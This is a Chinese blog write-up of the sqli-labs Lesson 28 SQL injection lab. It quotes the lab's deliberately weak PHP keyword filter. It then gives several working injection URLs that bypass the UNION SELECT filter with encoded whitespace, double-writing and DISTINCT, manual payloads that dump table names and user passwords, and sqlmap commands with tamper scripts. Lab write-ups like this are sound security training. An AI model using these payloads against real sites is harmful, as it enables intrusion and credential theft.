---
title: sqli-labs lession-28 GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号
date: 2018-10-07 20:03:26
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-28 GET基于错误-你的UNION和SELECT归我所有-字符型单引号和括号

---

## 登录界面

![001](/img/sql/Lesson-28/001.png)

## 分析

这标题有毒吧,不是基于错误吗,结果源码里把报错注释了,结果我做成布尔盲注了。

```
function blacklist($id)
{
$id= preg_replace('/[\/\*]/',"", $id);		//过滤 / *.
$id= preg_replace('/[--]/',"", $id);		//过滤 -.
$id= preg_replace('/[#]/',"", $id);			//过滤 #.
$id= preg_replace('/[ +]/',"", $id);		//过滤 空格 +.
//$id= preg_replace('/select/m',"", $id);	
$id= preg_replace('/[ +]/',"", $id);	    //过滤 空格 +.
$id= preg_replace('/union\s+select/i',"", $id);	 //过滤无论大小写的（UNION 空格符 SELECT）.单独的不会过虑。
return $id;
}
```
绕过空格都是前几课做的,这里就将绕过过滤（UNION 空格符 SELECT）

1. 用`union all select`替代`union 空格符 select`

`http://192.168.75.132/sql/Less-28/?id=4')%0AuNion%0Aall%0AseLect%0A1,2,3%0Aand('1`

![002](/img/sql/Lesson-28/002.png)

2. 用`%A0`替代空格

`%A0`有时候会被解析成特殊字符,php-5.2.17版本可行

`http://192.168.75.132/sql/Less-28/?id=4')%0AuNion%A0seLect%0A1,2,3%0Aand('1`

![003](/img/sql/Lesson-28/003.png)

3. 双写绕过用`unionuNion%0AseLect%0Aselect`替代`union select`

`http://192.168.75.132/sql/Less-28/?id=2')%0AunionuNion%0AseLect%0Aselect%0A1,2,3%0Aand('1`

![004](/img/sql/Lesson-28/004.png)

4. 在union和select中间添加谓词  （distinct,distinctrow）

`http://192.168.75.132/sql/Less-28/?id=3')%0AuNion%0Adistinct%0AseLect%0A1,2,3%0Aand('1`

![005](/img/sql/Lesson-28/005.png)

## 手注

直接结果

`http://192.168.75.132/sql/Less-28/?id=2'and%0A1=2)%0Aunion%0Aall%0AseLect%0A1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='security')),3%0A%0Aand('1`

![006](/img/sql/Lesson-28/006.png)

`http://192.168.75.132/sql/Less-28/?id=2'and%0A1=2)%0Aunion%0Aall%0AseLect%0A1,(select(group_concat(id,'~',username,'~',password))from(security.users)),3%0A%0Aand('1`

![007](/img/sql/Lesson-28/007.png)

## SQLMAP

写了的`union select`绕过脚本没用上。

`python sqlmap.py -u "http://192.168.75.132/sql/Less-28/?id=1" --method GET --technique B --dbms mysql --threads 10 --level 2 --flush-session --fresh-queries --tamper "space0A.py" -v 3`

![008](/img/sql/Lesson-28/008.png)

![009](/img/sql/Lesson-28/009.png)

`python sqlmap.py -u "http://192.168.75.132/sql/Less-28/?id=1" --method GET --technique B --dbms mysql --threads 10 --level 2  --tamper "space0A.py" --dbs`

![010](/img/sql/Lesson-28/010.png)

`python sqlmap.py -u "http://192.168.75.132/sql/Less-28/?id=1" --method GET --technique B --dbms mysql --threads 10  --tamper "space0A.py" -v 3 -D security --tables`

![011](/img/sql/Lesson-28/011.png)

`python sqlmap.py -u "http://192.168.75.132/sql/Less-28/?id=1" --method GET --technique B --dbms mysql --threads 10  --tamper "space0A.py,count.py" -D security -T users --columns --dump`

![012](/img/sql/Lesson-28/012.png)




